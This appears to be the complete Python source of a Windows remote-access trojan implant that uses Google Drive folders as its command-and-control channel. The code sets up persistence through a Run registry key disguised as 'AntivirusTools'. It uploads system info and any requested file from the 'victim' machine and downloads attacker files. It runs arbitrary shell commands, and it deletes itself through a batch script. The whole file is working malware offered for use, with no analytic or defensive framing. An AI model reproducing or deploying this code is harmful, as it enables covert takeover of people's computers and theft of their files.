from apiclient import discovery
from apiclient.http import *
import uuid
from apiclient import errors
import time
import io
import json
import platform
import os
import os.path
import subprocess
from winreg import *
import sys


# This may or may not be from stack overflow
def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


def upload_file(drive_service, dict, parent_id, name):
    fh = io.BytesIO(dict.encode())
    media = MediaIoBaseUpload(fh, mimetype='application/json',
                              chunksize=1024 * 1024, resumable=True)
    file_metadata = {
        'name': name,
        'mimeType': 'application/json',
        'parents': [parent_id]
    }
    created_file = drive_service.files().create(body=file_metadata,
                                                media_body=media,
                                                fields='id').execute()

def delete_file(service, file_id):
    service.files().delete(fileId=file_id).execute()

def load_credentials():
    from google.oauth2 import service_account
    import googleapiclient.discovery

    SCOPES = [
        'https://www.googleapis.com/auth/drive'
    ]
    SERVICE_ACCOUNT_FILE = resource_path('creds.json')

    credentials = service_account.Credentials.from_service_account_file(
        SERVICE_ACCOUNT_FILE, scopes=SCOPES)

    return credentials

def create_victim_folder(service):
    victimID = uuid.uuid4()

    folder_id = 'root'
    file_metadata = {
        'name': str(victimID),
        'mimeType': 'application/vnd.google-apps.folder',
        'parents': [folder_id]
    }

    victimFolder = service.files().create(body=file_metadata, fields='id').execute()

    #Create subfolders

    folder_id = victimFolder.get('id')
    file_metadata = {
        'name': "ToAttacker",
        'mimeType': 'application/vnd.google-apps.folder',
        'parents': [folder_id]
    }

    service.files().create(body=file_metadata, fields='id').execute()

    folder_id = victimFolder.get('id')
    file_metadata = {
        'name': "FromAttacker",
        'mimeType': 'application/vnd.google-apps.folder',
        'parents': [folder_id]
    }

    service.files().create(body=file_metadata, fields='id').execute()

    return victimFolder.get('id')


def poll_victim_folder(service, folderID):
    param = {}
    fromAttackerFolderName = "FromAttacker"
    toAttackerFolderName = "ToAttacker"
    fromAttackerFolderId = None
    toAttackerFolderId = None
    children = service.files().list(q="'" +folderID + "' in parents",
                                           spaces='drive',
                                           fields='nextPageToken, files(id, name)').execute()

    for child in children.get('files', []):
        if(child['name'] == toAttackerFolderName):
            toAttackerFolderId = child['id']

    for child in children.get('files', []):
        if(child['name'] == fromAttackerFolderName):
            fromAttackerFolderId = child['id']
    if(fromAttackerFolderId != None):
        children = service.files().list(q="'" + fromAttackerFolderId + "' in parents",
                                        spaces='drive',
                                        fields='nextPageToken, files(id, name)').execute()
        for child in children.get('files', []):
            parse_command(child, service, toAttackerFolderId)
    else:
        key = r'Software\SystemFiles'
        runKey = r'Software\Microsoft\Windows\CurrentVersion\Run\AntivirusTools'
        try:
            path = os.path.realpath(sys.executable)
            newpath = os.path.join(os.path.split(path)[0], "tmp.bat")
            cmd = '@ECHO OFF\r\nTIMEOUT /T 2 /NOBREAK\r\nDEL {}\r\nDEL {}\r\n'.format(path, newpath)
            with open(newpath, "w") as f:
                f.write(cmd)
            os.startfile(newpath)
            DeleteKey(HKEY_CURRENT_USER, key)
            DeleteKey(HKEY_CURRENT_USER, runKey)
        finally:
            sys.exit(0)
    time.sleep(10)


def parse_command(child, service, toAttackerFolderId):
    childId = child['id']
    try:
        media = service.files().get_media(fileId=childId).execute()
    except Exception:
        return

    try:
        command = json.loads(media.decode("utf-8"))
        # File Uploaded to "ToAttacker" Folder Must Be Uploaded From Service Account Otherwise Will Not Be Able to Delete it
        delete_file(service, childId)
        if("command" in command):
            if(command["command"] == "get_machine_info"):
                get_machine_info(service, toAttackerFolderId)
            if(command["command"] == "get_file"):
                get_file(service, command["filename"], toAttackerFolderId)
            if(command["command"] == "send_file"):
                send_file(service, command["filename"], toAttackerFolderId)
            if(command["command"] == "execute"):
                execute(service, command["cmd"], toAttackerFolderId)
            if(command["command"] == "execute_file"):
                execute_file(service, command["filename"], command["cmd"], toAttackerFolderId)
    except ValueError as e:
        pass


def get_machine_info(service, toAttackerFolderId):
    name = "machine_info"
    uname = platform.uname()
    machineInfo = "System: " + uname.system + ", Node: " + uname.node + ", Release: " + uname.release + ", Version: " + uname.version + ", Machine: " + uname.machine + ", Processor: " + uname.processor
    dict = {"status": "OK", "details": "Machine Info Was Successfully Uploaded", "stdout": machineInfo}
    dictString = json.dumps(dict)
    upload_file(service, dictString, toAttackerFolderId, name)


def get_file(service, attackFile, toAttackerFolderId):
    file_metadata = {
        'name': attackFile,
        'parents': [toAttackerFolderId]
    }
    try:
        response = MediaFileUpload(attackFile)
        file = service.files().create(body=file_metadata, media_body=response, fields='id').execute()
        dict = {"status": "OK", "details": "File successfully uploaded."}
    except FileNotFoundError as err:
        dict = {"status": "ERROR", "details": "File or Directory Name Could Not be Located on the Victim's Machine"}
    finally:
        dictString = json.dumps(dict)
        upload_file(service, dictString, toAttackerFolderId, "get_file")


def send_file(service, filename, toAttackerFolderId):
    name = "send_file"
    dict = None
    dictString = None
    fileid = None

    results = service.files().list(
        pageSize=10, fields="nextPageToken, files(id, name)").execute()
    items = results.get('files', [])

    for item in items:
        if item['name'] == os.path.basename(os.path.normpath(filename)):
            filename = item['name']
            fileid = item['id']

    if fileid is not None:
        request = service.files().get_media(fileId=fileid)
        fh = io.FileIO(filename, 'wb', closefd=True)
        downloader = MediaIoBaseDownload(fh, request) #, chunksize=1024*1024) #, resumable=True)
        done = False
        while done is False:
            status, done = downloader.next_chunk()

        delete_file(service, fileid)
        dict = {"status": "OK", "details": "Downloaded File Successfully"}
        dictString = json.dumps(dict)
        upload_file(service, dictString, toAttackerFolderId, name)

    if fileid is None:
        dict = {"status": "ERROR", "details": "File Download Not Successful. Could Not Locate FileID."}
        dictString = json.dumps(dict)
        upload_file(service, dictString, toAttackerFolderId, name)

def execute(service, executeCommand, toAttackerFolderId):
    name = "execute_command"
    dict = None
    dictString = None
    result = subprocess.run(executeCommand, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, universal_newlines=True, shell=True)
    if result.returncode == 0:
        dict = {"status": "OK", "details": "Command Executed Successfully", "stdout": result.stdout}
    else:
        dict = {"status": "OK", "details": "Command Execution Failed", "stderr": result.stderr}
    if dict != None:
        dictString = json.dumps(dict)
    upload_file(service, dictString, toAttackerFolderId, name)

def execute_file(service, filename, executeCommand, toAttackerFolderId):
    name = "execute_file"
    send_file(service, filename, toAttackerFolderId)
    execute(service, executeCommand, toAttackerFolderId)

def main():
    creds = load_credentials()
    service = discovery.build('drive', 'v3', credentials=creds)

    path = os.path.dirname(os.path.abspath(__file__))
    path = path + "\\victim.exe"
    try:
        runKey = OpenKey(HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run', KEY_ALL_ACCESS)
        runKeyValue = QueryValueEx(runKey, 'AntivirusTools')[0]
    except:
        runKey = CreateKey(HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run')
        SetValueEx(runKey, 'AntivirusTools', 1, REG_SZ, path)

    CloseKey(runKey)


    # Store FolderID in Registry Key
    keyVal = r'Software\SystemFiles'
    try:
        key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
        folderID = QueryValueEx(key, "Config")[0]
    except:
        key = CreateKey(HKEY_CURRENT_USER, keyVal)
        #Create New Victim Folder with Subfolders
        folderID = create_victim_folder(service)
        SetValueEx(key, "Config", 0, REG_SZ, folderID)
    CloseKey(key)

    while True:
        poll_victim_folder(service, folderID)

if __name__ == '__main__':
    main()